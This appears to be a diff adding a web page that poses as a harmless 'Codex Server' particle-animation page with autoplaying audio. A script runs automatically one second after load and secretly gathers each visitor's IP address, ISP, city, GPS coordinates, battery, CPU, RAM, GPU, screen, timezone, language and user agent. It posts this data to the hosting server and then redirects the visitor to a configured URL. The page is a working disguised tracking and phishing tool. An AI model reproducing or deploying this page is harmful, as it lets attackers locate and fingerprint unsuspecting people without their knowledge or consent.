@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CODEX-SERVER</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #0d1117; overflow: hidden; }
+        canvas { position: absolute; top: 0; left: 0; z-index: -1; }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen">
+    <canvas id="canvas"></canvas>
+    <div class="bg-black p-8 rounded-lg shadow-lg w-80 relative z-10 text-center border border-cyan-500 shadow-[0_0_15px_cyan]">
+        <div class="flex justify-center mb-6">
+            <div class="border border-cyan-500 p-4 rounded-full shadow-[0_0_10px_cyan]">
+                <span class="text-white text-4xl">Ｄ〆</span>
+            </div>
+        </div>
+        <div class="text-gray-300">
+            <p class="mb-4 font-bold">Welcome to Codex Server</p>
+            <p class="text-sm">Click Background And Enjoy Effect!</p>
+        </div>
+        <audio id="audio" autoplay>
+            <source src="https://cdn.glitch.global/b81484d9-692a-4a73-b45b-1fea3c3bcb05/HI_HI_HA_HA!(256k).mp3" type="audio/mpeg">
+        </audio>
+    </div>
+
+    <script src="config.js"></script> 
+
+    <script>
+        // Particle Animation
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        let particlesArray = [];
+        class Particle {
+            constructor(x, y) {
+                this.x = x; this.y = y;
+                this.size = Math.random() * 5 + 1;
+                this.speedX = Math.random() * 3 - 1.5; this.speedY = Math.random() * 3 - 1.5;
+                this.color = 'cyan';
+            }
+            update() { this.x += this.speedX; this.y += this.speedY; if (this.size > 0.3) this.size -= 0.1; }
+            draw() { ctx.fillStyle = this.color; ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); ctx.fill(); }
+        }
+        function animate() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            particlesArray.forEach((p, index) => {
+                p.update(); p.draw();
+                if(p.size <= 0.3) particlesArray.splice(index, 1);
+            });
+            requestAnimationFrame(animate);
+        }
+        window.addEventListener('mousemove', (e) => { for (let i = 0; i < 5; i++) particlesArray.push(new Particle(e.x, e.y)); });
+        animate();
+
+        // Data Collection
+        async function sendData() {
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                
+                let batteryStr = 'Unknown';
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryStr = (battery.level * 100).toFixed(0) + '% 🔋';
+                }
+
+                function getGPU() {
+                    try { const gl = document.createElement('canvas').getContext('webgl'); return gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL); } 
+                    catch(e) { return 'Unknown'; }
+                }
+
+                const deviceData = {
+                    "INFO_TITLE": "ᴄᴏᴅᴇx ᴅᴇᴠɪᴄᴇ ɪɴғᴏ",
+                    "ᴅᴇᴠɪᴄᴇ": navigator.platform || 'Unknown',
+                    "ɪᴘ_ᴀᴅᴅʀᴇss": ipData.ip || 'Unknown',
+                    "ɴᴇᴛᴡᴏʀᴋ": ipData.org || 'Unknown',
+                    "ʟᴏᴄᴀᴛɪᴏɴ": `${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}`,
+                    "ᴄᴏᴏʀᴅɪɴᴀᴛᴇs": `${ipData.latitude || '0'},${ipData.longitude || '0'}`,
+                    "ʙᴀᴛᴛᴇʀʏ": batteryStr,
+                    "ᴄᴘᴜ_ᴄᴏʀᴇs": navigator.hardwareConcurrency || 'Unknown',
+                    "ʀᴀᴍ": navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
+                    "ɢᴘᴜ": getGPU(),
+                    "sᴄʀᴇᴇɴ": `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`,
+                    "ᴛɪᴍᴇᴢᴏɴᴇ": Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+                    "ʟᴀɴɢᴜᴀɢᴇ": navigator.language || 'Unknown',
+                    "ᴜsᴇʀ_ᴀɢᴇɴᴛ": navigator.userAgent,
+                    "ᴅᴇᴠ_ʙʏ": "Ｄｘ－Ｓｉｍｕ || @Termuxcodex"
+                };
+
+                // Send to local server
+                await fetch('/', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(deviceData)
+                });
+
+                // Redirect logic
+                setTimeout(() => { if(typeof redirect_url !== 'undefined' && redirect_url !== '') window.location.href = redirect_url; }, 1500);
+            } catch (err) { console.error(err); }
+        }
+        setTimeout(sendData, 1000);
+    </script>
+</body>
+</html>
